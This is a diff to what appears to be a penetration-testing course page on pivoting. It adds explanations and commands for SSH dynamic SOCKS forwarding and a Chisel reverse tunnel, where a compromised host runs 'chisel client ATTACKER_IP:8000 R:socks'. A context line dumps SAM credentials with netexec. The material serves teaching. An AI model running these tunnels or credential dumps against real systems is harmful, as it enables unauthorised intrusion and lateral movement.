@@ -98,6 +98,30 @@ netexec smb 10.10.10.5 -u user -p pass --sam
       <CodeBlock label="conceptual — SSH local port forwarding as a simple pivot">{`ssh -L 8080:10.10.40.5:80 user@foothold-box
 # now http://localhost:8080 on YOUR machine tunnels through foothold-box to reach
 # 10.10.40.5:80, a host on a network segment you can't route to directly`}</CodeBlock>
+      <p>
+        <code>-L</code> forwards exactly one predetermined port — fine for one known target, but tedious the
+        moment you need to reach an entire unfamiliar internal subnet through the pivot. SSH's{' '}
+        <strong>dynamic</strong> forwarding (<code>-D</code>) solves that by turning your own machine into a
+        full SOCKS proxy: point any SOCKS-aware tool at it and route <em>anything</em> through the pivot, not
+        just one pre-picked port.
+      </p>
+      <CodeBlock label="a dynamic SOCKS proxy — route arbitrary tools through the pivot, not just one port">{`ssh -D 1080 user@foothold-box
+# now ANY SOCKS-aware tool — curl, nmap (via proxychains), Python's requests (as shown in the
+# Python module's recon-automation lesson) — can route through foothold-box by pointing at
+# 127.0.0.1:1080, reaching the entire internal subnet, not just one hardcoded destination`}</CodeBlock>
+      <p>
+        When SSH itself isn't available on the pivot (a Windows foothold, or a restricted shell),{' '}
+        <strong>Chisel</strong> is the standard fallback — a single static binary that tunnels the same kind
+        of SOCKS proxy over plain HTTP, which routes through firewalls that would block raw SSH outright:
+      </p>
+      <CodeBlock label="Chisel — the SSH-less equivalent, tunneled over HTTP">{`# on your attack box (the server side of the tunnel):
+chisel server -p 8000 --reverse
+
+# on the compromised host (the client side, dialing back out):
+chisel client ATTACKER_IP:8000 R:socks
+# now a SOCKS proxy is listening on YOUR attack box, tunneled through the compromised host's
+# outbound HTTP connection — useful specifically when that host can reach the internet
+# but you can't reach it directly, the exact shape of most real internal footholds`}</CodeBlock>
 
       <Callout variant="tip">
         <p>
